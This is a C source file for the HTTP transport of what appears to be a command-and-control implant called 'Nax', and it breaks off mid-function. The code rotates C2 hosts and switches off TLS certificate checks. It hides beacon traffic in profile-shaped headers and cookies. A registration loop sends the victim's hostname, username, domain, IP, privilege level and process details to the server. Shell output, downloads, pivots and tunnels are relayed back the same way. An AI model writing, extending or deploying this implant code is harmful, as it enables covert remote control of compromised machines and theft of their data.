/* beacon/src/Transport/Http.c
 * WinHTTP transport with persistent session/connection handles.
 * hSession + hConnect are kept alive across heartbeats when sleep < 60s.
 * Only hRequest is created/destroyed per call.
 *
 * Codec helpers (NaxEncodeData, NaxDecodeData, header/URL builders) live
 * in HttpCodec.c. */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"
#include <winhttp.h>

#ifndef WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
#endif

/* ========= [ rotation helper ] ========= */

FUNC BYTE NaxRotateIdx( PNAX_INSTANCE Nax, BYTE idx, BYTE count ) {
    if ( count == 0 ) return 0;
    if ( Nax->Config.Rotation == 1 ) {
        BYTE r = 0;
        Nax->Bcrypt.BCryptGenRandom( NULL, &r, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
        return r % count;
    }
    return ( idx + 1 ) % count;
}

/* ========= [ host rotation URL builder ] ========= */

FUNC static VOID NaxBuildHostUrl( PNAX_INSTANCE Nax, PCHAR host, PWCHAR out, UINT32 cap ) {
    UINT32 wi = 0;
    BOOL is_https = ( Nax->Config.C2Url[0] == 'h' && Nax->Config.C2Url[4] == 's' );
    if ( is_https ) {
        CHAR s[] = {'h','t','t','p','s',':','/','/'}; for ( UINT32 c = 0; c < 8 && wi < cap - 1; c++ ) out[wi++] = (WCHAR)s[c];
    } else {
        CHAR s[] = {'h','t','t','p',':','/','/'}; for ( UINT32 c = 0; c < 7 && wi < cap - 1; c++ ) out[wi++] = (WCHAR)s[c];
    }
    for ( UINT32 c = 0; host[c] && wi < cap - 1; c++ ) out[wi++] = (WCHAR)(BYTE)host[c];
    out[wi] = L'\0';
}

FUNC static VOID NaxRotateHost( PNAX_INSTANCE Nax, PWCHAR c2_url_w, UINT32 cap ) {
    if ( Nax->Config.HostCount == 0 ) return;
    BYTE hidx = Nax->Config.HostIdx;
    NaxBuildHostUrl( Nax, Nax->Config.Hosts[hidx], c2_url_w, cap );
    Nax->Config.HostIdx = NaxRotateIdx( Nax, hidx, Nax->Config.HostCount );
    if ( Nax->Config.HostCount > 1 && Nax->hConnect ) {
        Nax->Winhttp.WinHttpCloseHandle( Nax->hConnect );
        Nax->hConnect = NULL;
    }
}

/* ========= [ SSL certificate bypass ] ========= */

FUNC static VOID NaxHttpDisableSslVerify( PNAX_INSTANCE Nax, HINTERNET hRequest ) {
    DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    Nax->Winhttp.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof( sec ) );
}

/* ========= [ session lifecycle ] ========= */

FUNC VOID NaxHttpClose( PNAX_INSTANCE Nax ) {
    if ( Nax->hConnect ) { Nax->Winhttp.WinHttpCloseHandle( Nax->hConnect ); Nax->hConnect = NULL; }
    if ( Nax->hSession ) { Nax->Winhttp.WinHttpCloseHandle( Nax->hSession ); Nax->hSession = NULL; }
}

FUNC BOOL NaxHttpEnsureSession( PNAX_INSTANCE Nax, const PWCHAR host, INTERNET_PORT port ) {
    if ( Nax->Config.SleepMs > NAX_HTTP_STALE_MS )
        NaxHttpClose( Nax );

    if ( ! Nax->hSession ) {
        WCHAR ua_buf[256];
        if ( Nax->Config.UserAgent[ 0 ] ) {
            UINT32 ui = 0;
            while ( Nax->Config.UserAgent[ ui ] && ui < 254 ) { ua_buf[ui] = (WCHAR)(BYTE)Nax->Config.UserAgent[ ui ]; ui++; }
            ua_buf[ui] = L'\0';
        } else {
            WCHAR def[] = { 'N','o','N','a','m','e','A','x','/','0','.','1','\0' };
            MmCopy( ua_buf, def, sizeof( def ) );
        }

        Nax->hSession = Nax->Winhttp.WinHttpOpen( ua_buf, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        if ( ! Nax->hSession ) return FALSE;

        DWORD secProto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
        Nax->Winhttp.WinHttpSetOption( Nax->hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &secProto, sizeof( secProto ) );
    }

    if ( ! Nax->hConnect ) {
        Nax->hConnect = Nax->Winhttp.WinHttpConnect( Nax->hSession, host, port, 0 );
        if ( ! Nax->hConnect ) { NaxHttpClose( Nax ); return FALSE; }
    }

    return TRUE;
}

/* ========= [ response reader ] ========= */

FUNC INT NaxReadResponse( PNAX_INSTANCE Nax, HINTERNET hRequest, PBYTE resp_buf, UINT32* resp_len ) {
    DWORD code    = 0;
    DWORD code_sz = sizeof( code );
    if ( ! Nax->Winhttp.WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_sz, WINHTTP_NO_HEADER_INDEX ) ) return NAX_ERR_NET;
    if ( code != 200 ) {
        NaxDbg( Nax, "[resp] HTTP status=%lu (expected 200)", (ULONG)code );
        return NAX_ERR_NET;
    }

    UINT32 cap   = *resp_len;
    UINT32 total = 0;
    DWORD  avail = 0;
    do {
        if ( ! Nax->Winhttp.WinHttpQueryDataAvailable( hRequest, &avail ) ) return NAX_ERR_NET;
        if ( avail == 0 ) break;
        if ( total >= cap ) {
            BYTE scratch[256]; DWORD got = 0;
            if ( ! Nax->Winhttp.WinHttpReadData( hRequest, scratch, (DWORD)( avail < 256 ? avail : 256 ), &got ) ) return NAX_ERR_NET;
            continue;
        }
        DWORD remain = (DWORD)( cap - total );
        DWORD want   = remain < avail ? remain : avail;
        DWORD got    = 0;
        if ( ! Nax->Winhttp.WinHttpReadData( hRequest, resp_buf + total, want, &got ) ) return NAX_ERR_NET;
        total += got;
    } while ( avail > 0 );

    *resp_len = total;
    return NAX_OK;
}

/* ========= [ HTTP POST ] ========= */

FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, const PBYTE body, UINT32 body_len, PBYTE resp_buf, UINT32* resp_len ) {
    HINTERNET hRequest      = NULL;
    INT       rc            = NAX_ERR_NET;
    PBYTE     body_enc_buf  = NULL;
    PCHAR     meta_enc      = NULL;
    PWCHAR    hdrs          = NULL;

    WCHAR use_url[256];
    if ( Nax->Config.ProfileLoaded && Nax->Config.PostUriCount > 0 ) {
        BYTE idx  = Nax->Config.PostUriIdx;
        PCHAR uri = Nax->Config.PostUris[ idx ];
        Nax->Config.PostUriIdx = NaxRotateIdx( Nax, idx, Nax->Config.PostUriCount );
        if ( ! NaxBuildUrl( Nax, url_w, uri, use_url, 256 ) ) goto cleanup;
    } else {
        UINT32 len = 0; while ( url_w[len] && len < 255 ) len++;
        for ( UINT32 c = 0; c < len; c++ ) use_url[c] = url_w[c];
        use_url[len] = L'\0';
    }

    URL_COMPONENTS uc;
    MmZero( &uc, sizeof( uc ) );
    uc.dwStructSize     = sizeof( uc );
    WCHAR host[256]     = { 0 };
    WCHAR path[512]     = { 0 };
    uc.lpszHostName     = host;
    uc.dwHostNameLength = 256;
    uc.lpszUrlPath      = path;
    uc.dwUrlPathLength  = 512;
    if ( ! Nax->Winhttp.WinHttpCrackUrl( use_url, 0, 0, &uc ) ) goto cleanup;

    if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;

    meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
    UINT32 meta_enc_len = 0;
    UINT32 sid_len = 0;
    while ( sid[ sid_len ] ) sid_len++;

    if ( Nax->Config.ProfileLoaded ) {
        meta_enc_len = NaxEncodeData( Nax, &Nax->Config.PostClientMeta, (PBYTE)sid, sid_len, (PBYTE)meta_enc, 2047 );
        if ( meta_enc_len > 0 ) meta_enc[ meta_enc_len ] = '\0';
    }

    PBYTE  send_body     = (PBYTE)body;
    UINT32 send_body_len = body_len;

    {
        UINT32 body_enc_cap = ( body_len + 8 ) * 2 + 2048;
        body_enc_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, body_enc_cap );
        if ( !body_enc_buf ) goto cleanup;

        if ( Nax->Config.ProfileLoaded && Nax->Config.PostClientOutput.Format != NAX_FMT_RAW ) {
            UINT32 enc_len = NaxEncodeData( Nax, &Nax->Config.PostClientOutput, body, body_len, body_enc_buf, body_enc_cap );
            if ( enc_len > 0 ) {
                send_body     = body_enc_buf;
                send_body_len = enc_len;
            }
        }
    }

    {
        DWORD flags = WINHTTP_FLAG_REFRESH;
        if ( uc.nScheme == INTERNET_SCHEME_HTTPS )
            flags |= WINHTTP_FLAG_SECURE;

        WCHAR method[] = { 'P', 'O', 'S', 'T', '\0' };
        WCHAR accept_all[] = { '*', '/', '*', '\0' };
        LPCWSTR accept_types[] = { accept_all, NULL };
        hRequest = Nax->Winhttp.WinHttpOpenRequest( Nax->hConnect, method, path, NULL, WINHTTP_NO_REFERER, accept_types, flags );
        if ( ! hRequest ) goto retry;

        if ( flags & WINHTTP_FLAG_SECURE )
            NaxHttpDisableSslVerify( Nax, hRequest );
    }

    hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
    if ( Nax->Config.ProfileLoaded ) {
        NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.PostClientHdrs, 256, Nax->Config.PostClientHdrCount, &Nax->Config.PostClientMeta, meta_enc_len > 0 ? meta_enc : NULL, meta_enc_len, TRUE, hdrs, 2048 );
    } else {
        /* Pre-profile fallback: beacon ID header + Content-Type */
        UINT32 wi = 0;
        wi = NaxAppendAsciiW( Nax->Config.BeaconIdHdr, hdrs, wi, 4096 );
        if ( wi < 4095 ) hdrs[ wi++ ] = L':';
        if ( wi < 4095 ) hdrs[ wi++ ] = L' ';
        wi = NaxAppendAsciiW( sid, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        CHAR ct[] = { 'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','o','c','t','e','t','-','s','t','r','e','a','m','\0' };
        wi = NaxAppendAsciiW( ct, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        CHAR hdr_p[] = { 'X','-','N','a','X','-','P','u','b','l','i','c',':',' ','1','\0' };
        wi = NaxAppendAsciiW( hdr_p, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        hdrs[ wi ] = L'\0';
    }

    if ( ! Nax->Winhttp.WinHttpSendRequest( hRequest, hdrs, (DWORD)( -1L ), (PVOID)( send_body ), (DWORD)( send_body_len ), (DWORD)( send_body_len ), 0 ) )
        goto retry;
    if ( ! Nax->Winhttp.WinHttpReceiveResponse( hRequest, NULL ) )
        goto retry;

    rc = NaxReadResponse( Nax, hRequest, resp_buf, resp_len );

    if ( rc == NAX_OK && *resp_len > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.PostServerOutput.Format != NAX_FMT_RAW || Nax->Config.PostServerOutput.Mask || Nax->Config.PostServerOutput.PrependLen > 0 || Nax->Config.PostServerOutput.AppendLen > 0 ) ) {
        UINT32 dec_cap = *resp_len + 256;
        PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
        if ( dec_buf ) {
            UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.PostServerOutput, resp_buf, *resp_len, dec_buf, dec_cap );
            if ( dec_len > 0 && dec_len <= dec_cap ) {
                MmCopy( resp_buf, dec_buf, dec_len );
                *resp_len = dec_len;
            }
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
        }
    }
    goto cleanup;

retry:
    if ( hRequest ) { Nax->Winhttp.WinHttpCloseHandle( hRequest ); hRequest = NULL; }
    NaxHttpClose( Nax );

cleanup:
    if ( meta_enc )     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, meta_enc );
    if ( hdrs )         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, hdrs );
    if ( body_enc_buf ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, body_enc_buf );
    if ( hRequest )     Nax->Winhttp.WinHttpCloseHandle( hRequest );
    return rc;
}

/* ========= [ HTTP GET (heartbeat) ] ========= */

FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, const PBYTE body, UINT32 body_len, PBYTE resp_buf, UINT32* resp_len ) {
    HINTERNET hRequest = NULL;
    INT       rc       = NAX_ERR_NET;
    PCHAR     meta_enc = NULL;
    PWCHAR    hdrs     = NULL;

    meta_enc = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 2048 );
    if ( !meta_enc ) return NAX_ERR_NOMEM;
    UINT32 meta_enc_len = 0;

    if ( Nax->Config.ProfileLoaded ) {
        meta_enc_len = NaxEncodeData( Nax, &Nax->Config.GetClientMeta, body, body_len, (PBYTE)meta_enc, 2047 );
        if ( meta_enc_len == 0 ) { rc = NAX_ERR_NOMEM; goto cleanup; }
        meta_enc[ meta_enc_len ] = '\0';
    } else {
        /* Pre-profile fallback: base64 encode for cookie */
        meta_enc_len = NaxBase64Encode( body, body_len, meta_enc, 2048 );
        if ( meta_enc_len == 0 ) { rc = NAX_ERR_NOMEM; goto cleanup; }
    }

    WCHAR use_url[256];
    if ( Nax->Config.GetUriCount > 0 ) {
        BYTE idx  = Nax->Config.GetUriIdx;
        PCHAR uri = Nax->Config.GetUris[ idx ];
        Nax->Config.GetUriIdx = NaxRotateIdx( Nax, idx, Nax->Config.GetUriCount );
        if ( ! NaxBuildUrl( Nax, url_w, uri, use_url, 256 ) ) goto cleanup;
    } else {
        UINT32 len = 0; while ( url_w[len] && len < 255 ) len++;
        for ( UINT32 c = 0; c < len; c++ ) use_url[c] = url_w[c];
        use_url[len] = L'\0';
    }

    URL_COMPONENTS uc;
    MmZero( &uc, sizeof( uc ) );
    uc.dwStructSize = sizeof( uc );
    WCHAR host[256] = { 0 };
    WCHAR path_w[512] = { 0 };
    uc.lpszHostName = host;
    uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path_w;
    uc.dwUrlPathLength = 512;
    if ( ! Nax->Winhttp.WinHttpCrackUrl( use_url, 0, 0, &uc ) ) goto cleanup;

    if ( ! NaxHttpEnsureSession( Nax, host, uc.nPort ) ) goto cleanup;

    {
        WCHAR final_path[1024];
        if ( Nax->Config.ProfileLoaded ) {
            NaxBuildPathWithParams( path_w, final_path, 1024, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, (const PCHAR)Nax->Config.GetClientParams, 128, Nax->Config.GetClientParamCount );
        } else {
            UINT32 pi = 0;
            while ( path_w[ pi ] ) { final_path[ pi ] = path_w[ pi ]; pi++; }
            final_path[ pi ] = L'\0';
        }

        DWORD flags = WINHTTP_FLAG_REFRESH;
        if ( uc.nScheme == INTERNET_SCHEME_HTTPS )
            flags |= WINHTTP_FLAG_SECURE;

        WCHAR method[] = { 'G', 'E', 'T', '\0' };
        WCHAR accept_all[] = { '*', '/', '*', '\0' };
        LPCWSTR accept_types[] = { accept_all, NULL };
        hRequest = Nax->Winhttp.WinHttpOpenRequest( Nax->hConnect, method, final_path, NULL, WINHTTP_NO_REFERER, accept_types, flags );
        if ( ! hRequest ) goto retry;

        if ( flags & WINHTTP_FLAG_SECURE )
            NaxHttpDisableSslVerify( Nax, hRequest );
    }

    hdrs = (PWCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, 4096 );
    if ( Nax->Config.ProfileLoaded ) {
        NaxBuildRequestHeaders( Nax, sid, (const PCHAR)Nax->Config.GetClientHdrs, 256, Nax->Config.GetClientHdrCount, &Nax->Config.GetClientMeta, meta_enc, meta_enc_len, FALSE, hdrs, 2048 );
    } else {
        /* Pre-profile fallback: beacon ID header + Cookie */
        UINT32 wi = 0;
        wi = NaxAppendAsciiW( Nax->Config.BeaconIdHdr, hdrs, wi, 4096 );
        if ( wi < 4095 ) hdrs[ wi++ ] = L':';
        if ( wi < 4095 ) hdrs[ wi++ ] = L' ';
        wi = NaxAppendAsciiW( sid, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        CHAR ck[] = { 'C','o','o','k','i','e',':',' ','\0' };
        wi = NaxAppendAsciiW( ck, hdrs, wi, 4096 );
        CHAR cn[] = { '_','_','s','e','s','s','i','o','n','=','\0' };
        wi = NaxAppendAsciiW( cn, hdrs, wi, 4096 );
        wi = NaxAppendAsciiW( meta_enc, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        CHAR hdr_p[] = { 'X','-','N','a','X','-','P','u','b','l','i','c',':',' ','1','\0' };
        wi = NaxAppendAsciiW( hdr_p, hdrs, wi, 4096 );
        wi = NaxAppendCRLF( hdrs, wi, 4096 );
        hdrs[ wi ] = L'\0';
    }

    {
        PVOID  req_body     = NULL;
        DWORD  req_body_len = 0;

        if ( Nax->Config.ProfileLoaded && Nax->Config.GetClientMeta.Placement == NAX_PLACE_BODY ) {
            req_body     = (PVOID)meta_enc;
            req_body_len = (DWORD)meta_enc_len;
        }

        if ( ! Nax->Winhttp.WinHttpSendRequest( hRequest, hdrs, (DWORD)( -1L ), req_body, req_body_len, req_body_len, 0 ) )
            goto retry;
        if ( ! Nax->Winhttp.WinHttpReceiveResponse( hRequest, NULL ) )
            goto retry;
    }

    /* Query Content-Length; if response exceeds caller's buffer, allocate dynamically */
    {
        DWORD contentLength = 0, contentLengthSize = sizeof( contentLength );
        PBYTE  readBuf = resp_buf;
        UINT32 readCap = *resp_len;

        if ( Nax->Winhttp.WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &contentLength, &contentLengthSize, WINHTTP_NO_HEADER_INDEX ) && contentLength > readCap ) {
            PBYTE big = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, contentLength );
            if ( big ) {
                readBuf = big;
                readCap = contentLength;
            }
        }

        UINT32 readLen = readCap;
        rc = NaxReadResponse( Nax, hRequest, readBuf, &readLen );

        if ( rc == NAX_OK && readLen > 0 && Nax->Config.ProfileLoaded && ( Nax->Config.GetServerOutput.Format != NAX_FMT_RAW || Nax->Config.GetServerOutput.Mask || Nax->Config.GetServerOutput.PrependLen > 0 || Nax->Config.GetServerOutput.AppendLen > 0 ) ) {
            UINT32 dec_cap = readLen + 256;
            PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
            if ( dec_buf ) {
                UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.GetServerOutput, readBuf, readLen, dec_buf, dec_cap );
                if ( dec_len > 0 && dec_len <= dec_cap ) {
                    if ( readBuf == resp_buf ) {
                        MmCopy( resp_buf, dec_buf, dec_len );
                        *resp_len = dec_len;
                    } else {
                        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, readBuf );
                        Nax->DynResp    = dec_buf;
                        Nax->DynRespLen = dec_len;
                        *resp_len       = 0;
                        dec_buf         = NULL;
                    }
                }
                if ( dec_buf )
                    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
            } else if ( readBuf != resp_buf ) {
                Nax->DynResp    = readBuf;
                Nax->DynRespLen = readLen;
                *resp_len       = 0;
            }
        } else if ( readBuf != resp_buf ) {
            if ( rc == NAX_OK ) {
                Nax->DynResp    = readBuf;
                Nax->DynRespLen = readLen;
                *resp_len       = 0;
            } else {
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, readBuf );
            }
        } else {
            *resp_len = readLen;
        }
    }
    goto cleanup;

retry:
    if ( hRequest ) { Nax->Winhttp.WinHttpCloseHandle( hRequest ); hRequest = NULL; }
    NaxHttpClose( Nax );

cleanup:
    if ( meta_enc ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, meta_enc );
    if ( hdrs )     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, hdrs );
    if ( hRequest ) Nax->Winhttp.WinHttpCloseHandle( hRequest );
    return rc;
}

/* ========= [ GET/POST dispatch ] ========= */

FUNC INT NaxHttpGetOrPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid, const PBYTE body, UINT32 body_len, PBYTE resp_buf, UINT32* resp_len ) {
    if ( Nax->Config.ProfileLoaded )
        return NaxHttpGet( Nax, url_w, sid, body, body_len, resp_buf, resp_len );
    return NaxHttpPost( Nax, url_w, sid, body, body_len, resp_buf, resp_len );
}

/* ========= [ HTTP main loop helpers ] ========= */

FUNC static INT HttpSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 frame_len = frame_cap;
    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return NAX_ERR_FAIL;
    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return NAX_ERR_FAIL;
    UINT32 resp_len = resp_cap;
    return NaxSend( Nax, c2_url, Nax->SessionId, env, env_len, resp, &resp_len );
}

FUNC static VOID HttpRelayPivots( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 piv_len = NaxProcessPivots( Nax, result, result_cap );
    PBYTE  piv_cur = result;
    UINT32 piv_rem = piv_len;
    while ( piv_rem >= 4 ) {
        UINT32 entryLen = *(UINT32*)piv_cur;
        if ( entryLen == 0 || 4 + entryLen > piv_rem ) break;
        HttpSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
        piv_cur += 4 + entryLen;
        piv_rem -= 4 + entryLen;
    }
    if ( piv_len > 0 )
        NaxDbg( Nax, "[pivot] processed %u bytes of child data", piv_len );
}

FUNC static VOID HttpRelayJobs( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 job_len = NaxProcessJobs( Nax, result, result_cap );
    UINT32 joff = 0;
    while ( joff + 9 <= job_len ) {
        BYTE   jtype = result[ joff ];
        UINT32 jtid  = NaxR32( result + joff + 1 );
        UINT32 jdata = NaxR32( result + joff + 5 );
        if ( joff + 9 + jdata > job_len ) break;
        HttpSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
        joff += 9 + jdata;
    }
}

FUNC static VOID HttpRelayShells( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 sh_len = NaxProcessShells( Nax, result, result_cap );
    UINT32 soff = 0;
    while ( soff + 9 <= sh_len ) {
        BYTE   stype = result[ soff ];
        UINT32 stid  = NaxR32( result + soff + 1 );
        UINT32 sdata = NaxR32( result + soff + 5 );
        if ( soff + 9 + sdata > sh_len ) break;
        HttpSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
        soff += 9 + sdata;
    }
}

FUNC static VOID HttpRelayDownloads( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 dl_len = NaxProcessDownloads( Nax, result, result_cap );
    UINT32 doff = 0;
    while ( doff + 8 <= dl_len ) {
        UINT32 tid  = NaxR32( result + doff );
        UINT32 dlen = NaxR32( result + doff + 4 );
        if ( doff + 8 + dlen > dl_len ) break;
        HttpSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
        doff += 8 + dlen;
    }
}

FUNC static VOID HttpRelayTunnels( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap ) {
    UINT32 tun_len = NaxProcessTunnels( Nax, result, result_cap );
    if ( tun_len > 0 )
        HttpSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, c2_url, resp, resp_cap );
}

/* ========= [ NaxHttpMain - HTTP register + heartbeat loop ] ========= */

FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax ) {
    UINT32 IO_CAP     = NAX_IO_CAP;
    UINT32 RESULT_CAP = NAX_IO_CAP;
    UINT32 FRAME_CAP  = RESULT_CAP + 256;

    PBYTE resp_h   = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, IO_CAP );
    PBYTE plain_h  = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, IO_CAP );
    PBYTE result_h = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, RESULT_CAP );
    PBYTE frame_h  = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
    PBYTE env_h    = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
    if ( !resp_h || !plain_h || !result_h || !frame_h || !env_h ) return;

    BYTE raw[8];
    Nax->Bcrypt.BCryptGenRandom( NULL, raw, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    NaxHexEncode( raw, 8, Nax->SessionId );
    NaxDbg( Nax, "session: %s", Nax->SessionId );
    NaxDbg( Nax, "beacon_id_hdr: %s", Nax->Config.BeaconIdHdr );

    WCHAR c2_url_w[128];
    NaxAsciiToWide( Nax->Config.C2Url, c2_url_w, 128 );

    NAX_SYSINFO info;
    NaxGatherSysInfo( Nax, &info );

    UINT32 frame_len = FRAME_CAP;
    UINT32 env_len   = FRAME_CAP;
    UINT32 resp_len  = IO_CAP;

    /* ---- REGISTER retry loop ---- */
    for ( ;; ) {
        NaxRotateHost( Nax, c2_url_w, 128 );
        frame_len = FRAME_CAP; env_len = FRAME_CAP; resp_len = IO_CAP;

        BYTE   reg_body[NAX_REG_BODY_BUF]; UINT32 reg_body_len = NAX_REG_BODY_BUF;
        if ( NaxBuildRegBody( info.Hostname, info.HnLen, info.Username, info.UnLen, NAX_ARCH_X64, info.Pid, Nax->Config.SleepMs, info.Tid, info.IpStr, info.IpLen, info.Domain, info.DmLen, info.Procname, info.PnLen, Nax->Elevated, Nax->OsMajor, Nax->OsMinor, Nax->OsBuild, Nax->ParentPid, Nax->Acp, Nax->OemCp, Nax->ImgPath, info.ImLen, reg_body, &reg_body_len ) != NAX_OK ) continue;

        if ( NaxFrameEncode( NAX_WIRE_REGISTER, reg_body, reg_body_len, frame_h, &frame_len ) != NAX_OK ) continue;
        if ( NaxEncrypt( Nax, frame_h, frame_len, env_h, &env_len ) != NAX_OK ) continue;

        BYTE saved_profile = Nax->Config.ProfileLoaded;

        WCHAR reg_url[256];
        if ( saved_profile && Nax->Config.PostUriCount > 0 ) {
            BYTE idx  = Nax->Config.PostUriIdx;
            PCHAR uri = Nax->Config.PostUris[idx];
            Nax->Config.PostUriIdx = NaxRotateIdx( Nax, idx, Nax->Config.PostUriCount );
            if ( ! NaxBuildUrl( Nax, c2_url_w, uri, reg_url, 256 ) ) continue;
            NaxDbg( Nax, "REGISTER -> uri[%d] %s", (int)idx, uri );
        } else {
            UINT32 ul = 0; while ( c2_url_w[ul] && ul < 255 ) ul++;
            for ( UINT32 c = 0; c < ul; c++ ) reg_url[c] = c2_url_w[c];
            reg_url[ul] = L'\0';
            NaxDbg( Nax, "REGISTER -> %s", Nax->Config.C2Url );
        }

        Nax->Config.ProfileLoaded = 0;
        INT reg_rc = NaxSend( Nax, reg_url, Nax->SessionId, env_h, env_len, resp_h, &resp_len );
        Nax->Config.ProfileLoaded = saved_profile;
        NaxDbg( Nax, "REGISTER rc=%d resp=%u", reg_rc, resp_len );

        if ( reg_rc != NAX_OK || resp_len == 0 ) {
            Nax->Kernel32.Sleep( Nax->Config.SleepMs );
            continue;
        }

        if ( saved_profile && ( Nax->Config.PostServerOutput.Format != NAX_FMT_RAW || Nax->Config.PostServerOutput.Mask || Nax->Config.PostServerOutput.PrependLen > 0 || Nax->Config.PostServerOutput.AppendLen > 0 ) ) {
            UINT32 dec_cap = resp_len + 256;
            PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
            if ( dec_buf ) {
                UINT32 dec_len = NaxDecodeData( Nax, &Nax->Config.PostServerOutput, resp_h, resp_len, dec_buf, dec_cap );
                if ( dec_len > 0 && dec_len <= dec_cap ) {
                    MmCopy( resp_h, dec_buf, dec_len );
                    resp_len = dec_len;
                }
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
            }
        }

        UINT32 prof_plain_len = IO_CAP;
